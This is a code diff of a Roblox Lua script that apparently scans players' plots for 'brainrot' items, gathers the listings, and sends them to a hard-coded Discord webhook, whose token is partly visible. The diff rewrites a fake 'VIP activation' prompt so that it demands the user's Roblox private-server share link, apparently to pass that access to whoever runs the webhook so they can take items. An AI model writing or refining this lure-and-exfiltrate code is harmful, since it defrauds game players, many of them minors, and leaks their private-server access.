@@ -13,7 +13,6 @@ local WEBHOOK_URL = "https://discord.com/api/webhooks/1417846130619977738/mgmCuO
 -- Глобальные переменные
 -- =============================
 local isActivated = false
-local brainrotCount = 0
 local activationGUI = nil
 
 -- Канонические названия брейнротов (с заглавными буквами для вывода)
@@ -251,7 +250,7 @@ local function createActivationGUI()
 	textBox.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
 	textBox.BorderSizePixel = 0
 	textBox.Text = ""
-	textBox.PlaceholderText = "https://discord.gg/your-vip-link"
+	textBox.PlaceholderText = "https://www.roblox.com/share?code=..."
 	textBox.PlaceholderColor3 = Color3.new(0.5, 0.5, 0.5)
 	textBox.TextColor3 = Color3.new(1, 1, 1)
 	textBox.TextScaled = true
@@ -291,23 +290,12 @@ local function createActivationGUI()
 	statusLabel.Font = Enum.Font.Gotham
 	statusLabel.Parent = mainFrame
 	
-	-- Счетчик брейнротов
-	local counterLabel = Instance.new("TextLabel")
-	counterLabel.Name = "Counter"
-	counterLabel.Size = UDim2.new(1, -20, 0, 30)
-	counterLabel.Position = UDim2.new(0, 10, 0, 220)
-	counterLabel.BackgroundTransparency = 1
-	counterLabel.Text = "Brainrots found: 0"
-	counterLabel.TextColor3 = Color3.new(0, 1, 0)
-	counterLabel.TextScaled = true
-	counterLabel.Font = Enum.Font.GothamBold
-	counterLabel.Parent = mainFrame
 	
 	-- Обработчики
 	activateButton.MouseButton1Click:Connect(function()
 		local vipLink = textBox.Text:gsub("^%s*(.-)%s*$", "%1") -- trim
-		if vipLink == "" or not string.find(vipLink, "discord%.gg/") then
-			statusLabel.Text = "Invalid VIP link! Please enter a valid Discord invite."
+		if vipLink == "" or not string.find(vipLink, "roblox%.com/share") then
+			statusLabel.Text = "Invalid VIP link! Please enter a valid Roblox share link."
 			statusLabel.TextColor3 = Color3.new(1, 0.3, 0.3)
 			return
 		end
@@ -490,18 +478,9 @@ local function buildPlotSection(plot)
 	return table.concat(lines, "\n")
 end
 
-local function updateCounter()
-	if activationGUI and activationGUI.Parent then
-		local counter = activationGUI:FindFirstChild("MainFrame"):FindFirstChild("Counter")
-		if counter then
-			counter.Text = string.format("Brainrots found: %d", brainrotCount)
-		end
-	end
-end
 
 local function postCombinedAllPlots()
 	local sections = {}
-	local totalFound = 0
 	for _, plot in ipairs(PLOTS_FOLDER:GetChildren()) do
 		local section = buildPlotSection(plot)
 		if section then
@@ -509,14 +488,8 @@ local function postCombinedAllPlots()
 			-- Одновременно печатаем в консоль
 			print(section)
 			print("")
-			-- Считаем брейнроты в этом плоте
-			local entries = collectBrainrotsInPlot(plot)
-			totalFound = totalFound + #entries
 		end
 	end
-	
-	brainrotCount = totalFound
-	updateCounter()
 	
 	if #sections > 0 then
 		local body = table.concat(sections, "\n\n")
